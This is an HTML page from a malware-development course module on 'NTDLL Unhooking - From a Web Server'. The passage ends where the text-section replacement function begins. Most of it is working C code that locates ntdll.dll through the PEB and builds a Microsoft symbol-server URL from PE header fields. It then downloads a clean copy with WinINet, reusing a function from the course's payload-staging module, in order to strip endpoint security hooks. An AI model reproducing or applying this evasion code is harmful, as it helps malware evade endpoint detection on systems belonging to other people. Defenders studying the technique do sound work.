<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>87. NTDLL Unhooking - From a Web Server</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="d1bcc5c3-167c-4308-8e31-dd211efded76" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/87"><strong>87. NTDLL Unhooking - From a Web Server</strong></a></h1></header><div class="page-body"><h2 id="704f5940-500a-4cc5-8143-212ae465ce14" class=""><strong>NTDLL Unhooking - From a Web Server</strong></h2><h3 id="05ae9f22-0624-4cf3-93ba-9f2805ea0938" class=""><strong>Introduction</strong></h3><p id="a9d030b4-f121-4a2d-a879-12600c87ae3d" class="">By now the reader should have an understanding of several ways to unhook <code>ntdll.dll</code>. One may ask, why not simply include a clean version of NTDLL in the binary? The issue with that approach is one would need to have several versions of NTDLL included in the binary in order to support the multiple version of Windows OS. As a result, this would greatly increase the size of the implementation, making this a flawed approach.</p><p id="13d6081d-ddb2-44de-a78d-3a658b3e97a2" class="">This module will demonstrate an alternative approach that fetches NTDLL from a web server. The implementation will first check the NTDLL version on the current machine and fetch the appropriate version of NTDLL from the web server. The difficult part of this approach is to upload all versions of NTDLL on a web server, therefore in this module, <a href="https://winbindex.m417z.com/">Winbindex</a> will be utilized which contains almost all <code>ntdll.dll</code> versions.</p><h3 id="f9b32058-4969-4848-88c9-43a935990427" class=""><strong>Winbindex</strong></h3><p id="74814e03-47c9-4505-a92b-e93c7bb7028d" class="">Winbindex is a website that contains several versions of files found on Windows OS. Additionally, it contains a search utility to search for the required file. The image below is the output of searching for the 64-bit version of <a href="https://winbindex.m417z.com/?file=ntdll.dll">ntdll.dll</a></p><figure id="1274f11c-46b7-4c60-8489-3fe9f823769f" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-118739986-88f6cb96-f2b6-4b20-8b93-7d32de908cb8.png"><img style="width:1523px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-118739986-88f6cb96-f2b6-4b20-8b93-7d32de908cb8.png"/></a></figure><h3 id="e740cb1f-e636-4212-a64f-16f3583f09eb" class=""><strong>Determining Winbindex&#x27;s URL Format</strong></h3><p id="eaa9b531-ab3f-43ca-932c-8418c3f80c2b" class="">Because <code>ntdll.dll</code> must be fetched programmatically, it&#x27;s important to understand how download links are formatted. Analyze the 3 URLs below:</p><ol type="1" id="d986d69c-a33b-4b3a-a82a-ac851b003074" class="numbered-list" start="1"><li><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/494079D61ee000/ntdll.dll">https://msdl.microsoft.com/download/symbols/ntdll.dll/494079D61ee000/ntdll.dll</a></li></ol><ol type="1" id="3dc290b1-749b-4d7f-9210-aae0c751510d" class="numbered-list" start="2"><li><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/2EEE8BDD1ee000/ntdll.dll">https://msdl.microsoft.com/download/symbols/ntdll.dll/2EEE8BDD1ee000/ntdll.dll</a></li></ol><ol type="1" id="0c95d7cb-0e5e-4184-a421-e2ab50dbfdc0" class="numbered-list" start="3"><li><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/F2E8A5AB214000/ntdll.dll">https://msdl.microsoft.com/download/symbols/ntdll.dll/F2E8A5AB214000/ntdll.dll</a></li></ol><p id="94b32817-ecea-42c5-9ad6-189045a2c39d" class="">Notice how only one part of the URL changes. This is visualized in the following image.</p><figure id="d5290865-4570-453f-9848-87bc58d2fc05" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-218741853-fb112eb2-6058-4c09-bf31-6361daeb1dad.png"><img style="width:1364px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-218741853-fb112eb2-6058-4c09-bf31-6361daeb1dad.png"/></a></figure><p id="53e81ad5-1641-4ba2-a5c6-4690f131c977" class="">Links 1 &amp; 2 both contain &quot;1ee000&quot; in the URL, which is 2023424 in decimal. Viewing the additional information regarding the first NTDLL module and searching for the value &quot;2023424&quot; reveals that it&#x27;s the NTDLL&#x27;s VirtualSize.</p><figure id="95f9d9de-31ed-4417-82c8-16c6a45e098d" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-318747866-fb9bb405-fce4-46b1-9797-a0787569d065.png"><img style="width:1216px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-318747866-fb9bb405-fce4-46b1-9797-a0787569d065.png"/></a></figure><figure id="4d3c5aba-6130-43ee-9612-897a78d344b9" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-418747883-88d09ac7-5a26-4428-858a-5e38577d3ed5.png"><img style="width:1413px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-418747883-88d09ac7-5a26-4428-858a-5e38577d3ed5.png"/></a></figure><p id="9e5844a5-6cc6-4ed3-af03-a28a00c60870" class="">Searching for the first part of the string, &quot;494079D6&quot;, which is 1228962262 in decimal, reveals that this is the timestamp of the file.</p><figure id="e9bc4349-1e0c-4060-b770-91ddff586c34" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-518748318-85fde875-9b04-4087-99d7-99135d1fe75d.png"><img style="width:1401px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-518748318-85fde875-9b04-4087-99d7-99135d1fe75d.png"/></a></figure><p id="4dde0f05-6584-44b3-9f77-43f1f6576167" class="">Therefore, the first part of the URL, the timestamp, is derived from the <code>IMAGE_FILE_HEADER.TimeDateStamp</code> element of the DLL. The second part, VirtualSize, is derived from the <code>IMAGE_OPTIONAL_HEADER.SizeOfImage</code> element of the DLL.</p><p id="a2970adb-1baf-45e2-b45e-2028bdee9287" class="">Winbindex&#x27;s download links are visualized in the image below.</p><figure id="45ff6f2a-6259-4a6e-b106-0e3c2f6a1f84" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-618750624-b5511b03-9f66-42c6-ae0c-8262c7f9c7fb.png"><img style="width:1024px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-618750624-b5511b03-9f66-42c6-ae0c-8262c7f9c7fb.png"/></a></figure><h3 id="4f716337-5560-4a3e-ac93-a37f5b7b1651" class=""><strong>ReadNtdllFromServer Function</strong></h3><p id="67c0d478-83b2-4a07-bed3-f4b960c31a1c" class="">The next step is to build a function that creates a suitable URL for the local machine. This is what the following <code>ReadNtdllFromServer</code> function does.</p><p id="63b42254-dc6d-4450-805b-bcc0350a608c" class="">The <code>ReadNtdllFromServer</code> function calls <code>FetchLocalNtdllBaseAddress</code> to obtain the base address of the local <code>ntdll.dll</code> image to build the download URL. This is done using <code>wsprintfW</code> which combines the string &quot;https://msdl.microsoft.com/download/symbols/ntdll.dll/&quot;, which is the fixed part of the download link with <code>pImgNtHdrs-&gt;FileHeader.TimeDateStamp</code> and <code>pImgNtHdrs-&gt;OptionalHeader.SizeOfImage</code> values.</p><p id="9884210f-dc20-47c8-8e4a-0d709b108d1b" class="">Once that&#x27;s done, the function calls <code>GetPayloadFromUrl</code> which was introduced in the <em>Payload Staging - Web Server</em> module. This function is responsible for downloading the payload file from a web server, but in this case, it&#x27;s being utilized to download <code>ntdll.dll</code> from the generated link.</p><pre id="5d1df12b-e1bc-48a7-a0f4-934ce4c3093e" class="code code-wrap"><code>#define FIXED_URL	L&quot;https://msdl.microsoft.com/download/symbols/ntdll.dll/&quot;

PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64// Reaching to the &#x27;ntdll.dll&#x27; module directly (we know its the 2nd image after &#x27;ServerUnhooking.exe&#x27;)
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	return pLdr-&gt;DllBase;
}


BOOL ReadNtdllFromServer(OUT PVOID* ppNtdllBuf) {

	PBYTE      pNtdllModule             = (PBYTE)FetchLocalNtdllBaseAddress();
	PVOID      pNtdllBuffer             = NULL;
	SIZE_T     sNtdllSize               = NULL;
	WCHAR      szFullUrl [MAX_PATH]     = { 0 };

	// getting the dos header of the local ntdll image
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// getting the nt headers of the local ntdll image
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// constructing the download url
	wsprintfW(szFullUrl, L&quot;%s%0.8X%0.4X/ntdll.dll&quot;, FIXED_URL, pImgNtHdrs-&gt;FileHeader.TimeDateStamp, pImgNtHdrs-&gt;OptionalHeader.SizeOfImage);

	// &#x27;GetPayloadFromUrl&#x27; is used to download a file from a webserver
	if (!GetPayloadFromUrl(szFullUrl, &amp;pNtdllBuffer, &amp;sNtdllSize))
		return FALSE;

	// &#x27;sNtdllSize&#x27; will now contain the size of the downloaded ntdll.dll file
	// &#x27;pNtdllBuffer&#x27; will now contain the base address of the downloaded ntdll.dll file

	*ppNtdllBuf = pNtdllBuffer;

	return TRUE;
}
</code></pre><p id="cf07dc40-d7b2-4105-8a99-3449e6476460" class="">Recall that <code>GetPayloadFromUrl</code> has three parameters, the download URL, and two output parameters that represent the base address and size of the downloaded file, respectively.</p><pre id="10f0a9fa-d25c-4041-aa58-961bf3912eff" class="code code-wrap"><code>BOOL GetPayloadFromUrl(IN LPCWSTR szUrl, OUT PVOID* pNtdllBuffer, OUT PSIZE_T sNtdllSize) {

	BOOL		bSTATE			= TRUE;

	HINTERNET	hInternet		= NULL,
			    hInternetFile	= NULL;

	DWORD		dwBytesRead		= NULL;

	SIZE_T		sSize			= NULL; 	 			// Used as the total size counter

	PBYTE		pBytes			= NULL,					// Used as the total heap buffer counter
			    pTmpBytes		= NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L&quot;MalDevAcademy&quot;, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the ntdll file using theURL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
			printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole ntdll file bytes
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, &#x27;\0&#x27;, dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop
		if (dwBytesRead &lt; 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving
	*pNtdllBuffer   = pBytes;
	*sNtdllSize     = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);         // Closing handle
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);     // Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);  // Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);                   // Freeing the temp buffer
	return bSTATE;
}
</code></pre><h3 id="5a542314-1c78-464c-b734-10ace24a550a" class=""><strong>Putting It All Together</strong></h3><p id="b19aaa2e-dac3-4902-8787-989b7cab8f9c" class="">Now that an unhooked version of <code>ntdll.dll</code> is in memory, the <code>ReplaceNtdllTxtSection</code> function is utilized to replace the text section of the hooked <code>ntdll.dll</code> with the newly unhooked one. The only modification required is to use the <code>pUnhookedNtdll</code> parameter, which represents the base address of the NTDLL module fetched using the <code>ReadNtdllFromServer</code> function detailed above.</p><pre id="5fa3f3cd-47dd-4f12-8b90-2adcedf7216c" class="code code-wrap"><code>BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

